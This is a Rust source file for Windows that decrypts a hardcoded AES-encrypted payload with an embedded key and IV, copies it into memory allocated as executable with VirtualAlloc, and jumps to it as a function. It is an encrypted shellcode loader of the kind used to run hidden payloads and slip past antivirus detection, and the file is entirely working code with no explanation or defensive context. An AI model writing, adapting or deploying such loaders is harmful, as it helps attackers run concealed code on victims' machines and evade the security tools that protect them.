use aes::Aes128;
use block_modes::block_padding::Pkcs7;
use block_modes::{BlockMode, Cfb};
use hex_literal::hex;

use std::mem::transmute;
use winapi::ctypes::c_void;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::memoryapi::VirtualAlloc;

type Aes128ECfb = Cfb<Aes128, Pkcs7>;

fn main() {
    let key = "67575738516b6c46795649516670444e";
    let iv = hex!("57504c385a78736f336b4946426a626f");

    let encrypted = "bec5444b4caa2a312cd8d65132718f11d846f05d3e5f5cbeaea89ced7633cacd05deecf8c44d9cdb4e7b8edac3f0c61d7df95fafde665e0516f5d60c0a1022f1955ea8aee0c8277e22e15186823617e54f2147327a8c5d00ab5f21939d354dd3b32fa20f0221eaf0f5bb160f0cf56a1a71cbd6334b783824faa820373517c7851308fd2218ac047f5405cbef98032c819551c63c89cc8cdcc4f5214cc70bda9aa230c02a9a9031f2da06a0452cdd2a26ec324b1c2182dc593861af40626278d2ae2f5a5afd0dd8bc8fd2d57d6b58faf0be0862fce6ff05986f439cef62e93c52c2d012f230310e112b51a0bd90c1e9937ede238719cc76ade0dc6895bf7e44e2bd67c43bb8a3f59bdeedc12de0fc2a47d579f32f512aa16ad6326802797489c3";

    let decrypted = dec(&encrypted.to_string(), &key.to_string(), iv);

    let buffer = &hex::decode(decrypted).expect("msg")[..];

    unsafe {
        let ptr = VirtualAlloc(std::ptr::null_mut(), buffer.len(), 0x00001000, 0x40);

        if GetLastError() == 0 {
            std::ptr::copy(buffer.as_ptr() as *const u8, ptr as *mut u8, buffer.len());

            let exec = transmute::<*mut c_void, fn()>(ptr);
            exec();
        }
    }
}

fn dec(ciphertext: &String, key: &String, iv: [u8; 16]) -> String {
    let binding = hex::decode(ciphertext).expect("Decoding failed");
    let ciphertext = binding.as_slice();

    let key = hex::decode(key).expect("Decoding failed");

    let cipher = Aes128ECfb::new_from_slices(&key, &iv).unwrap();

    let mut buf = ciphertext.to_vec();
    let decrypted_ciphertext = cipher.decrypt(&mut buf).unwrap();

    hex::encode(decrypted_ciphertext)
}
